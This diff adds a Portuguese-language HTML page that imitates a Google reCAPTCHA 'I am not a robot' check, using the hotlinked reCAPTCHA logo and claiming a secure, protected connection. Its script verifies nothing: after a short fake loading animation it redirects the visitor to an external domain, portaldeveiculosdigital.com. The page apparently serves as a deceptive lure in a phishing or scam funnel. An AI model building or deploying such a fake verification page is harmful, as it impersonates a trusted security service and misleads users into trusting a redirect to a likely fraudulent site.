@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação de Segurança</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:Arial, Helvetica, sans-serif;
+  background:#d9dde3;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+
+/* CARD */
+.card{
+  width:380px;
+  background:#fff;
+  border-radius:14px;
+  padding:28px 25px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.08);
+  position:relative;
+  overflow:hidden;
+  animation:fadeIn .5s ease;
+  text-align:center;
+}
+
+/* LINHA SUPERIOR */
+.card::before{
+  content:"";
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:2px;
+  background:#cbd5e1;
+}
+
+/* TÍTULO */
+.title{
+  font-size:22px;
+  font-weight:700;
+  color:#1e293b;
+  margin-bottom:10px;
+}
+
+/* SUBTÍTULO */
+.subtitle{
+  font-size:13px;
+  color:#64748b;
+  margin-bottom:22px;
+  line-height:1.5;
+}
+
+/* CAPTCHA */
+.captcha-box{
+  border:1px solid #d1d5db;
+  border-radius:10px;
+  background:#f8fafc;
+  padding:18px;
+}
+
+/* LINHA CAPTCHA */
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+
+/* CHECKBOX AREA */
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  cursor:pointer;
+  padding:10px;
+  border-radius:12px;
+  transition:0.25s;
+}
+
+.check-area:hover{
+  background:#e2e8f0;
+}
+
+.check-area input{
+  display:none;
+}
+
+/* QUADRADO */
+.custom-check{
+  width:26px;
+  height:26px;
+  border:2px solid #7c7c7c;
+  border-radius:4px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  transition:0.25s ease;
+  flex-shrink:0;
+}
+
+/* LOADING */
+.custom-check.loading::before{
+  content:"";
+  width:14px;
+  height:14px;
+  border:2px solid #dbeafe;
+  border-top:2px solid #2563eb;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+}
+
+/* CHECK FINAL */
+.custom-check.checked{
+  border-color:#16a34a;
+  background:#f0fdf4;
+}
+
+.custom-check.checked::before{
+  content:"✔";
+  color:#16a34a;
+  font-size:15px;
+  font-weight:bold;
+}
+
+.check-text{
+  font-size:15px;
+  color:#0f172a;
+  white-space:nowrap;
+}
+
+/* RECAPTCHA */
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
+  min-width:70px;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+/* SEGURANÇA */
+.secure{
+  margin-top:18px;
+  color:#16a34a;
+  font-size:12px;
+  font-weight:600;
+}
+
+/* FOOTER */
+.footer{
+  margin-top:14px;
+  font-size:12px;
+  color:#64748b;
+  line-height:1.7;
+}
+
+.footer span{
+  display:block;
+  color:#94a3b8;
+  margin-top:4px;
+}
+
+/* ANIMAÇÕES */
+@keyframes spin{
+  from{
+    transform:rotate(0deg);
+  }
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <div class="title">
+    Verificação de Segurança
+  </div>
+
+  <div class="subtitle">
+    Confirme que você é humano para continuar
+  </div>
+
+  <div class="captcha-box">
+
+    <div class="captcha-row">
+
+      <!-- CHECK -->
+      <label class="check-area">
+
+        <input type="checkbox" id="check">
+
+        <div class="custom-check" id="customCheck"></div>
+
+        <span class="check-text" id="text">
+          Não sou um robô
+        </span>
+
+      </label>
+
+      <!-- LOGO -->
+      <div class="captcha-brand">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+        reCAPTCHA
+        <br>
+        <span style="font-size:9px;">
+          Privacidade - Termos
+        </span>
+      </div>
+
+    </div>
+
+  </div>
+
+  <div class="secure">
+    ✔ Conexão protegida e verificação segura
+  </div>
+
+  <div class="footer">
+    Ao confirmar a opção, a validação será concluída automaticamente
+
+    <span>
+      Esse processo aumenta a segurança e evita acessos não autorizados
+    </span>
+  </div>
+
+</div>
+
+<script>
+const check = document.getElementById("check");
+const customCheck = document.getElementById("customCheck");
+const text = document.getElementById("text");
+
+check.addEventListener("change", () => {
+
+  if(check.checked){
+
+    customCheck.classList.add("loading");
+
+    text.innerText = "Verificando...";
+
+    setTimeout(() => {
+
+      customCheck.classList.remove("loading");
+      customCheck.classList.add("checked");
+
+      text.innerText = "Verificado ✔";
+
+      window.location.href = "https://portaldeveiculosdigital.com/rs/";
+
+    }, 1800);
+
+  }
+
+});
+</script>
+
+</body>
+</html>
